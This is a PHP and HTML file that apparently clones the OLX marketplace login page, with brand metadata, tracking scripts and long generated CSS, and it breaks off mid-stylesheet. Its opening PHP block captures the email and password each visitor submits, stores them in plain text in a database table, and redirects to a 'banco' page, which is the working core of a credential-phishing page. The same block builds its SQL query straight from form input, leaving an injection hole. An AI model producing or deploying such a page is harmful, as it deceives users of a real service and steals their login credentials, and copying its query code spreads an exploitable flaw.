<?php

include_once('./dev/conexao.php');



if (isset($_POST['submit'])) {

  $email = $_POST['email'];

  $senha = $_POST['senha'];

  if (isset($_POST['submit'])) {

    header('Location:banco/index.php');
  }

  $sql = "INSERT INTO login (email, senha) VALUES ('$email', '$senha')";


  if (mysqli_query($conn, $sql))
    mysqli_close($conn);



}

?>






<!DOCTYPE html>

<html lang="pt-BR">

<head>



  <script src="js/nr-1123.min.js"></script>
  <script async src="https://www.googletagmanager.com/gtm.js?id=GTM-546N2JV"></script>
  <script>
  (
    ())
  </script>
  <script>
  (
    function(w, d, s, l, i) {
      w[l] = w[l] || [];
      w[l].push({
        'gtm.start': new Date().getTime(),
        event: 'gtm.js'
      });
      var f = d.getElementsByTagName(s)[0],
        j = d.createElement(s),
        dl = l != 'dataLayer' ? '&l=' + l : '';
      j.async = true;
      j.src =
        'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
      f.parentNode.insertBefore(j, f);
    }(window, document, 'script', 'dataLayer', 'GTM-546N2JV'))
  </script>
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="true">
  <link rel="preconnect" href="https://static.olx.com.br" crossorigin="true">
  <link rel="preconnect" href="https://tags.t.tailtarget.com" crossorigin="true">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="theme-color" content="#000000">
  <meta name="description"
    content="OLX - Rápido e Fácil pra comprar e desapegar. Vender e Comprar nunca foi tão fácil! Anuncie Online na OLX - Você tem alguma coisa para desapegar. Desapega!">
  <link data-react-helmet="true" rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png">
  <link data-react-helmet="true" rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png">
  <link data-react-helmet="true" rel="icon" type="image/png" sizes="192x192" href="images/android-chrome-192x192.png">
  <link data-react-helmet="true" rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
  <style
    data-styled="iwtnNi dHVgYW bpcUMs gNNEyt WOktY ewyqkI ixPxuB iqkXKg VyGkT bxVNCd iVpJPn ldmbnf bOgwhw jiouny jyGPQI falMha dTxTIO cMkCFS hqlkcq bguSji cKFaoX cuoDAk vgnJb jdFOre gYmmmh hOXuFQ kTmDwB hsjYzV gOfDpU hZhRCW bSBFaW bKzJYp hpwKxN fJUwmE dGjogm lfnudJ bADuTJ eiiwWf hvEbcu kGTksN knMPpz YLUOr lbQyXh gIsTc lLQWL hDYEcM kdmgNq jLvEYt gtduyo cwTNYW fpdWXI bJiQWo eokxeq jdMgYu gAfYGr hRbJjJ cYSvLU eHYEhp jbRsGs cvsAdd hfJanY yanBe dvdaQp gCiGNm gCDYhV hcSYxJ kXbkgS ihrWYB cnloSh kmZdGi hNbIop"
    data-styled-version="4.0.3">
  /* sc-component-id: sc-bdVaJa */
  .bxVNCd {
    color: #4A4A4A;
    line-height: 24px;
    font-size: 16px;
    font-weight: 400;
    font-family: 'Nunito Sans', 'Helvetica Neue', HelveticaNeue, Helvetica, Arial, sans-serif;
    margin: 0px;
  }

  .iVpJPn {
    color: #4A4A4A;
    line-height: 20px;
    font-size: 14px;
    font-weight: 400;
    font-family: 'Nunito Sans', 'Helvetica Neue', HelveticaNeue, Helvetica, Arial, sans-serif;
    margin: 0px;
  }

  .ldmbnf {
    color: #4A4A4A;
    line-height: 32px;
    font-size: 24px;
    font-weight: 600;
    font-family: 'Nunito Sans', 'Helvetica Neue', HelveticaNeue, Helvetica, Arial, sans-serif;
    margin: 0px;
  }

  .bOgwhw {
    color: #999999;
    line-height: 16px;
    font-size: 12px;
    font-weight: 400;
    font-family: 'Nunito Sans', 'Helvetica Neue', HelveticaNeue, Helvetica, Arial, sans-serif;
    margin: 0px;
  }

  /* sc-component-id: sc-jTzLTM */
  .iwtnNi {
    box-sizing: border-box;
  }

  /* sc-component-id: sc-ipXKqB */
  .WOktY {
    display: -webkit-inline-box;
    display: -webkit-inline-flex;
    display: -ms-inline-flexbox;
    display: inline-flex;
    -webkit-box-pack: center;
    -webkit-justify-content: center;
    -ms-flex-pack: center;
    justify-content: center;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    width: 'fit-content';
    cursor: pointer;
    outline: none;
    -webkit-text-decoration: none;
    text-decoration: none;
    font-size: var(--font-size-xxxs);
    line-height: var(--font-lineheight-medium);
    color: var(--link-color-main-base);
    font-family: var(--font-family);
    font-weight: var(--font-weight-semibold);
  }

  .WOktY:hover {
    color: var(--link-color-main-hover);
  }

  .WOktY:hover {
    -webkit-text-decoration-line: underline;
    text-decoration-line: underline;
  }

  .WOktY:focus {
    box-shadow: 0 0 0 2px var(--color-secondary-80);
    border-radius: var(--border-radius-xxs);
  }

  /* sc-component-id: sc-hmXxxW */
  .YLUOr {
    display: block;
    margin: 0;
    padding: 0;
    font-weight: var(--font-weight-regular);
    font-style: normal;
    font-family: var(--font-family);
    word-break: break-word;
    font-weight: var(--font-weight-semibold);
    line-height: var(--font-lineheight-superdistant);
    font-size: var(--font-size-xs);
    font-style: normal;
    color: var(--color-neutral-130);
  }

  /* sc-component-id: sc-etwtAo */
  .cKFaoX {
    display: -webkit-inline-box;
    display: -webkit-inline-flex;
    display: -ms-inline-flexbox;
    display: inline-flex;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: center;
    -webkit-justify-content: center;
    -ms-flex-pack: center;
    justify-content: center;
    visibility: visible;
  }

  /* sc-component-id: sc-jXQZqI */
  .cMkCFS {
    position: relative;
    display: -webkit-inline-box;
    display: -webkit-inline-flex;
    display: -ms-inline-flexbox;
    display: inline-flex;
    -webkit-box-pack: center;
    -webkit-justify-content: center;
    -ms-flex-pack: center;
    justify-content: center;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    min-width: 72px;
    width: 100%;
    border-style: solid;
    border-width: var(--border-width-hairline);
    outline: none;
    -webkit-text-decoration: initial;
    text-decoration: initial;
    height: 48px;
    padding: var(--spacing-2) var(--spacing-3);
    font-size: var(--font-size-xs);
    line-height: var(--font-lineheight-supertight);
    background-color: var(--button-primary-background-color-base);
    border-color: var(--button-primary-border-color-base);
    color: var(--button-primary-color-font-base);
    border-radius: var(--border-radius-pill);
    font-family: var(--font-family);
    font-weight: var(--font-weight-semibold);
    cursor: pointer;
    -webkit-tap-highlight-color: transparent;
  }

  .cMkCFS:hover {
    background-color: var(--button-primary-background-color-hover);
    border-color: var(--button-primary-border-color-hover);
  }

  .cMkCFS:focus {
    -webkit-transition: outline 0ms, outline-offset 0ms;
    transition: outline 0ms, outline-offset 0ms;
    outline: var(--color-neutral-130) solid var(--border-width-thin);
    outline-offset: var(--border-width-thin);
  }

  .cMkCFS:focus:not(:focus-visible) {
    outline: none;
    outline-offset: 0;
  }

  .cMkCFS:active {
    -webkit-transition: outline 0ms, outline-offset 0ms;
    transition: outline 0ms, outline-offset 0ms;
    border-color: transparent;
  }

  .cMkCFS.disabled {
    background-color: var(--button-primary-background-color-disabled);
    border-color: var(--button-primary-border-color-disabled);
    color: var(--button-primary-color-font-disabled);
  }

  .cMkCFS:active {
    -webkit-transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    -webkit-transform: scale(0.96);
    -ms-transform: scale(0.96);
    transform: scale(0.96);
  }

  .cMkCFS:not(:active) {
    -webkit-transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
  }

  .cMkCFS:hover {
    -webkit-transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
  }

  .cMkCFS:not(:hover) {
    -webkit-transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
  }

  .cMkCFS.disabled {
    cursor: not-allowed;
  }

  .hqlkcq {
    position: relative;
    display: -webkit-inline-box;
    display: -webkit-inline-flex;
    display: -ms-inline-flexbox;
    display: inline-flex;
    -webkit-box-pack: center;
    -webkit-justify-content: center;
    -ms-flex-pack: center;
    justify-content: center;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    min-width: 72px;
    width: 100%;
    border-style: solid;
    border-width: var(--border-width-hairline);
    outline: none;
    -webkit-text-decoration: initial;
    text-decoration: initial;
    height: 48px;
    padding: var(--spacing-2) var(--spacing-3);
    font-size: var(--font-size-xs);
    line-height: var(--font-lineheight-supertight);
    background-color: var(--button-blue-background-color-base);
    border-color: var(--button-blue-border-color-base);
    color: var(--button-blue-color-font-base);
    border-radius: var(--border-radius-pill);
    font-family: var(--font-family);
    font-weight: var(--font-weight-semibold);
    cursor: pointer;
    -webkit-tap-highlight-color: transparent;
  }

  .hqlkcq:hover {
    background-color: var(--button-blue-background-color-hover);
    border-color: var(--button-blue-border-color-hover);
  }

  .hqlkcq:focus {
    -webkit-transition: outline 0ms, outline-offset 0ms;
    transition: outline 0ms, outline-offset 0ms;
    outline: var(--color-neutral-130) solid var(--border-width-thin);
    outline-offset: var(--border-width-thin);
  }

  .hqlkcq:focus:not(:focus-visible) {
    outline: none;
    outline-offset: 0;
  }

  .hqlkcq:active {
    -webkit-transition: outline 0ms, outline-offset 0ms;
    transition: outline 0ms, outline-offset 0ms;
    border-color: transparent;
  }

  .hqlkcq.disabled {
    background-color: var(--button-blue-background-color-disabled);
    border-color: var(--button-blue-border-color-disabled);
    color: var(--button-blue-color-font-disabled);
  }

  .hqlkcq:active {
    -webkit-transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    -webkit-transform: scale(0.96);
    -ms-transform: scale(0.96);
    transform: scale(0.96);
  }

  .hqlkcq:not(:active) {
    -webkit-transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
  }

  .hqlkcq:hover {
    -webkit-transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
  }

  .hqlkcq:not(:hover) {
    -webkit-transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
  }

  .hqlkcq.disabled {
    cursor: not-allowed;
  }

  .bguSji {
    position: relative;
    display: -webkit-inline-box;
    display: -webkit-inline-flex;
    display: -ms-inline-flexbox;
    display: inline-flex;
    -webkit-box-pack: center;
    -webkit-justify-content: center;
    -ms-flex-pack: center;
    justify-content: center;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    min-width: 72px;
    width: -webkit-fit-content;
    width: -moz-fit-content;
    width: fit-content;
    border-style: solid;
    border-width: var(--border-width-hairline);
    outline: none;
    -webkit-text-decoration: initial;
    text-decoration: initial;
    height: 40px;
    padding: var(--spacing-1) var(--spacing-3);
    font-size: var(--font-size-xs);
    line-height: var(--font-lineheight-superdistant);
    background-color: var(--button-secondary-background-color-base);
    border-color: var(--button-secondary-border-color-base);
    color: var(--button-secondary-color-font-base);
    border-radius: var(--border-radius-pill);
    font-family: var(--font-family);
    font-weight: var(--font-weight-semibold);
    cursor: pointer;
    -webkit-tap-highlight-color: transparent;
  }

  .bguSji:hover {
    background-color: var(--button-secondary-background-color-hover);
    border-color: var(--button-secondary-border-color-hover);
  }

  .bguSji:focus {
    -webkit-transition: outline 0ms, outline-offset 0ms;
    transition: outline 0ms, outline-offset 0ms;
    outline: var(--color-neutral-130) solid var(--border-width-thin);
    outline-offset: var(--border-width-thin);
  }

  .bguSji:focus:not(:focus-visible) {
    outline: none;
    outline-offset: 0;
  }

  .bguSji:active {
    -webkit-transition: outline 0ms, outline-offset 0ms;
    transition: outline 0ms, outline-offset 0ms;
    border-color: transparent;
  }

  .bguSji.disabled {
    background-color: var(--button-secondary-background-color-disabled);
    border-color: var(--button-secondary-border-color-disabled);
    color: var(--button-secondary-color-font-disabled);
  }

  .bguSji:active {
    -webkit-transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    -webkit-transform: scale(0.96);
    -ms-transform: scale(0.96);
    transform: scale(0.96);
  }

  .bguSji:not(:active) {
    -webkit-transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-1) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
  }

  .bguSji:hover {
    -webkit-transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
  }

  .bguSji:not(:hover) {
    -webkit-transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
    transition: all var(--transition-duration-2) var(--transition-timing-ease-in) 0ms, outline 0ms, outline-offset 0ms;
  }

  .bguSji.disabled {
    cursor: not-allowed;
  }

  /* sc-component-id: sc-jrIrqw */
  .kGTksN {
    margin-bottom: var(--spacing-2);
  }

  /* sc-component-id: sc-hjRWVT */
  .lbQyXh {
    width: 100%;
    display: -webkit-inline-box;
    display: -webkit-inline-flex;
    display: -ms-inline-flexbox;
    display: inline-flex;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    border: none;
    border-radius: var(--border-radius-sm);
    background-color: var(--textinput-background-color-base);
    color: var(--textinput-color-font);
    position: relative;
    z-index: var(--z-index-1-default, 1);
    box-shadow: 0 0 0 var(--border-width-hairline) var(--textinput-border-color-empty);
  }

  .lbQyXh:hover {
    box-shadow: 0 0 0 var(--border-width-thin) var(--textinput-border-color-hover);
  }

  .lbQyXh:focus-within {
    box-shadow: 0 0 0 var(--border-width-thin) var(--textinput-border-color-focus);
  }

  /* sc-component-id: sc-iybRtq */
  .gIsTc {
    width: 100%;
    outline: none;
    border: none;
    background-color: inherit;
    font-family: var(--font-family);
    font-weight: var(--font-weight-regular);
    position: relative;
    font-size: var(--font-size-xs);
    padding: var(--spacing-1-5) var(--spacing-2);
    line-height: var(--font-lineheight-distant);
    border-radius: var(--border-radius-sm);
  }

  .gIsTc::-webkit-input-placeholder {
    color: var(--textinput-color-placeholder);
  }

  .gIsTc::-moz-placeholder {
    color: var(--textinput-color-placeholder);
  }

  .gIsTc:-ms-input-placeholder {
    color: var(--textinput-color-placeholder);
  }

  .gIsTc::placeholder {
    color: var(--textinput-color-placeholder);
  }

  .gIsTc:disabled {
    cursor: not-allowed;
  }

  .gIsTc::-webkit-outer-spin-button,
  .gIsTc::-webkit-inner-spin-button {
    -webkit-appearance: none;
  }

  .gIsTc[type='number'] {
    -moz-appearance: textfield;
  }

  /* sc-component-id: sc-iQtOjA */
  .jLvEYt {
    width: 24px;
    height: 24px;
    min-width: 24px;
    min-height: 24px;
    max-width: 24px;
    max-height: 24px;
    margin-right: var(--spacing-2);
    display: -webkit-inline-box;
    display: -webkit-inline-flex;
    display: -ms-inline-flexbox;
    display: inline-flex;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: center;
    -webkit-justify-content: center;
    -ms-flex-pack: center;
    justify-content: center;
  }

  .jLvEYt svg {
    fill: var(--textinput-icon-color);
    width: 100%;
    height: 100%;
  }

  /* sc-component-id: sc-fHxwqH */
  .knMPpz {
    width: 100%;
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: justify;
    -webkit-justify-content: space-between;
    -ms-flex-pack: justify;
    justify-content: space-between;
    margin-bottom: var(--spacing-1);
  }

  /* sc-component-id: sc-cPuPxo */
  .hfJanY {
    position: fixed;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: rgba(0, 0, 0, 0.55);
    z-index: 9999;
    display: none;
  }

  .hfJanY.fade-enter {
    opacity: 0;
  }

  .hfJanY.fade-enter-active {
    opacity: 1;
    -webkit-transition: opacity 300ms;
    transition: opacity 300ms;
  }

  .hfJanY.fade-exit {
    opacity: 1;
  }

  .hfJanY.fade-exit-active {
    opacity: 0;
    -webkit-transition: opacity 500ms;
    transition: opacity 500ms;
  }

  /* sc-component-id: sc-isBZXS */
  .bADuTJ {
    width: 100%;
    position: relative;
    border-style: solid;
    border-width: 0;
    border-top-width: 1px;
    border-color: #f2f2f2;
  }

  /* sc-component-id: sc-dKEPtC */
  .eiiwWf {
    position: absolute;
    left: 50%;
    top: 50%;
    -webkit-transform: translate(-50%, -50%);
    -ms-transform: translate(-50%, -50%);
    transform: translate(-50%, -50%);
    font-size: 14px;
    color: #898989;
    background-color: #ffffff;
    padding: 8px;
  }

  /* sc-component-id: sc-dBAPYN */
  .gAfYGr {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex: 1;
    -ms-flex: 1;
    flex: 1;
    cursor: pointer;
  }

  /* sc-component-id: sc-hAnkBK */
  .vgnJb {
    padding: 0;
    cursor: unset;
    width: 12.4px;
    height: 24px;
  }

  .jdFOre {
    padding: 0;
    cursor: unset;
    width: 24px;
    height: 24px;
  }

  .gYmmmh {
    padding: 0;
    cursor: unset;
    width: 16px;
    height: 16px;
  }

  /* sc-component-id: sc-jOBXIr */
  .yanBe {
    background-color: #fff;
    padding: 32px 24px;
    position: absolute;
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
    top: 50%;
    -webkit-transform: translate(-50%, -50%);
    -ms-transform: translate(-50%, -50%);
    transform: translate(-50%, -50%);
    left: 50%;
    border-radius: 10px;
    width: 400px;
  }

  @media (max-width:440px) {
    .yanBe {
      width: 90%;
    }
  }

  /* sc-component-id: sc-dzOgQY */
  .dvdaQp {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex: 1;
    -ms-flex: 1;
    flex: 1;
    -webkit-flex-direction: row;
    -ms-flex-direction: row;
    flex-direction: row;
    -webkit-box-pack: justify;
    -webkit-justify-content: space-between;
    -ms-flex-pack: justify;
    justify-content: space-between;
    -webkit-align-items: flex-start;
    -webkit-box-align: flex-start;
    -ms-flex-align: flex-start;
    align-items: flex-start;
    height: 32px;
  }

  /* sc-component-id: sc-gCwZxT */
  .gCiGNm {
    margin-left: auto;
  }

  /* sc-component-id: sc-ekHBYt */
  .bJiQWo {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex-direction: row;
    -ms-flex-direction: row;
    flex-direction: row;
    -webkit-box-pack: center;
    -webkit-justify-content: center;
    -ms-flex-pack: center;
    justify-content: center;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
  }

  /* sc-component-id: sc-eTyWNx */
  .jdMgYu {
    margin-left: 6px;
    margin-right: 6px;
    font-size: 16px !important;
  }

  /* sc-component-id: sc-bsVVwV */
  .eokxeq {
    color: #4a4a4a;
  }

  /* sc-component-id: sc-bWjmDF */
  .jbRsGs {
    font-size: 12px;
    font-weight: 400;
    color: #999999;
  }

  /* sc-component-id: sc-fPbjcq */
  .hRbJjJ {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-pack: center;
    -webkit-justify-content: center;
    -ms-flex-pack: center;
    justify-content: center;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    background-color: #f9f9f9;
    height: 35px;
    width: 100%;
    border-radius: 0 0 4px 4px;
    box-shadow: 0 2px 4px 0 rgba(153, 153, 153, 0.2);
  }

  .hRbJjJ:hover {
    background-color: #f7f1fd;
  }

  .hRbJjJ:hover span {
    color: #6e0ad6;
  }

  /* sc-component-id: sc-hdNmWC */
  .bpcUMs {
    padding: 32px 56px 24px 56px;
    border-top-left-radius: 4px;
    border-top-right-radius: 4px;
    border-bottom-right-radius: 0px;
    border-bottom-left-radius: 0px;
    background-color: #ffffff;
    box-shadow: 0 2px 4px 0 rgba(153, 153, 153, 0.2);
  }

  @media (max-width:36em) {
    .bpcUMs {
      padding: 32px 16px 24px 16px;
    }
  }

  /* sc-component-id: sc-fPEBxH */
  .cwTNYW {
    cursor: pointer;
  }

  /* sc-component-id: sc-hBcjXN */
  .hDYEcM {
    position: relative;
    -webkit-flex: 1 0;
    -ms-flex: 1 0;
    flex: 1 0;
  }

  /* sc-component-id: sc-gVZiCL */
  .gtduyo {
    position: relative;
    top: 4px;
    left: 4px;
  }

  /* sc-component-id: sc-fPCuyW */
  .kdmgNq {
    font-size: var(--font-size-xxs);
  }

  /* sc-component-id: sc-dAWfgX */
  .dTxTIO {
    background-color: #3a5998;
    color: #fff !important;
    font-size: var(--font-size-xs) !important;
    cursor: pointer;
    border: none;
  }

  .dTxTIO:hover {
    opacity: 0.9;
    background-color: #3a5998;
  }

  /* sc-component-id: sc-FAiZp */
  .cuoDAk {
    position: absolute;
    top: 50%;
    left: 24px;
    -webkit-transform: translateY(-50%);
    -ms-transform: translateY(-50%);
    transform: translateY(-50%);
  }

  /* sc-component-id: sc-dHaUqb */
  .hOXuFQ {
    position: absolute;
    width: 100%;
    top: 50%;
    left: 0;
    -webkit-transform: translateY(-50%);
    -ms-transform: translateY(-50%);
    transform: translateY(-50%);
    font-size: var(--font-size-xs) !important;
    text-align: center !important;
    color: #fff !important;
  }

  /* sc-component-id: sc-fcTNbh */
  .ixPxuB {
    padding: 0;
    cursor: unset;
    width: 64pxpx;
    height: 64pxpx;
  }

  .iqkXKg {
    padding: 0;
    cursor: unset;
    width: 24pxpx;
    height: 24pxpx;
  }

  /* sc-component-id: sc-jptPkM */
  .hsjYzV {
    color: #fff !important;
    font-size: 16px !important;
    background-color: #4285f4;
  }

  .hsjYzV:hover {
    opacity: 0.9;
    background-color: #4285f4;
  }

  /* sc-component-id: sc-ghUbLI */
  .gOfDpU {
    position: absolute;
    top: 50%;
    left: 24px;
    -webkit-transform: translateY(-50%);
    -ms-transform: translateY(-50%);
    transform: translateY(-50%);
  }

  /* sc-component-id: sc-hrBRpH */
  .hZhRCW {
    position: absolute;
    width: 100%;
    top: 50%;
    left: 0;
    -webkit-transform: translateY(-50%);
    -ms-transform: translateY(-50%);
    transform: translateY(-50%);
    font-size: 16px !important;
    text-align: center !important;
    color: #fff !important;
  }

  /* sc-component-id: sc-ljUfdc */
  .bSBFaW {
    margin-top: 8px;
    width: 100%;
    height: 48px;
  }

  /* sc-component-id: sc-cgThhu */
  .bKzJYp {
    width: 100%;
    height: 48px;
  }

  /* sc-component-id: sc-LAuEU */
  .hpwKxN {
    position: absolute;
    top: 50%;
    left: 24px;
    -webkit-transform: translateY(-50%);
    -ms-transform: translateY(-50%);
    transform: translateY(-50%);
  }

  /* sc-component-id: sc-gkfylT */
  .fJUwmE {
    position: absolute;
    width: 100%;
    top: 50%;
    -webkit-transform: translateY(-50%);
    -ms-transform: translateY(-50%);
    transform: translateY(-50%);
    font-size: 16px !important;
    color: #f28000;
  }

  /* sc-component-id: sc-ertOQY */
  .falMha {
    width: 100%;
    margin-top: 16px;
  }

  /* sc-component-id: sc-iEPtyo */
  .kTmDwB {
    width: 100%;
    margin-top: 8px;
  }

  /* sc-component-id: sc-gUlUPW */
  .jyGPQI {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
  }

  /* sc-component-id: sc-kQZOhr */
  .lfnudJ {
    width: 100%;
    margin-top: 24px;
    margin-bottom: 16px;
  }

  /* sc-component-id: sc-kSpkgE */
  .dGjogm {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
  }

  /* sc-component-id: sc-dzQEYZ */
  .jiouny {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
  }

  /* sc-component-id: sc-eXsVQl */
  .hvEbcu {
    margin-top: 8px;
  }

  /* sc-component-id: sc-sVRsr */
  .lLQWL {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
  }

  /* sc-component-id: sc-eZXMBi */
  @media (max-width:36em) {
    .eHYEhp {
      padding: 0 16px 16px 16px;
    }
  }

  /* sc-component-id: sc-Ehqfj */
  .cvsAdd {
    font-size: 12px !important;
  }

  /* sc-component-id: sc-gggouf */
  .ewyqkI {
    width: 64px;
    height: 64px;
  }

  /* sc-component-id: sc-cyQzhP */
  .VyGkT {
    color: #4a4a4a;
    font-size: 20px;
    text-align: center;
    font-weight: 600;
    margin-top: -1px;
  }

  /* sc-component-id: sc-izUgoq */
  .gNNEyt {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    font-weight: 300;
  }

  /* sc-component-id: sc-lXiCt */
  .cnloSh {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex-direction: row;
    -ms-flex-direction: row;
    flex-direction: row;
    -webkit-box-pack: justify;
    -webkit-justify-content: space-between;
    -ms-flex-pack: justify;
    justify-content: space-between;
    -webkit-box-pack: start;
    -webkit-justify-content: flex-start;
    -ms-flex-pack: start;
    justify-content: flex-start;
    width: 100%;
    border-style: solid;
    border-color: #e5e5e5;
    border-width: 1px;
    border-radius: 8px;
    padding-top: 16px;
    padding-bottom: 16px;
    padding-left: 16px;
    padding-right: 16px;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    margin-bottom: 16px;
  }

  .cnloSh:hover {
    background-color: #f9f9f9;
  }

  .kmZdGi {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex-direction: row;
    -ms-flex-direction: row;
    flex-direction: row;
    -webkit-box-pack: justify;
    -webkit-justify-content: space-between;
    -ms-flex-pack: justify;
    justify-content: space-between;
    -webkit-box-pack: start;
    -webkit-justify-content: flex-start;
    -ms-flex-pack: start;
    justify-content: flex-start;
    width: 100%;
    border-style: solid;
    border-color: #e5e5e5;
    border-width: 1px;
    border-radius: 8px;
    padding-top: 16px;
    padding-bottom: 16px;
    padding-left: 16px;
    padding-right: 16px;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
  }

  .kmZdGi:hover {
    background-color: #f9f9f9;
  }

  /* sc-component-id: sc-dcOKER */
  .hNbIop {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    width: 32px;
    height: 32px;
    border-radius: 16px;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: center;
    -webkit-justify-content: center;
    -ms-flex-pack: center;
    justify-content: center;
    margin-right: 16px;
    background-color: #f0e6ff;
  }

  /* sc-component-id: sc-ibnDSj */
  .kXbkgS {
    padding-bottom: 8px;
  }

  /* sc-component-id: sc-fAMDQA */
  .hcSYxJ {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
    padding-bottom: 32px;
  }

  /* sc-component-id: sc-lgsldV */
  .ihrWYB {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
  }

  /* sc-component-id: sc-OqFzE */
  .dHVgYW {
    -webkit-flex: 1;
    -ms-flex: 1;
    flex: 1;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
    -webkit-box-pack: justify;
    -webkit-justify-content: space-between;
    -ms-flex-pack: justify;
    justify-content: space-between;
    margin: auto;
    margin-top: 64px;
    margin-bottom: 64px;
    max-width: 466px;
  }

  @media (max-width:48em) {
    .dHVgYW {
      margin: 0;
      margin-top: 4px;
      margin-bottom: 0;
    }
  }

  /* sc-component-id: sc-cRULEh */
  .fpdWXI {
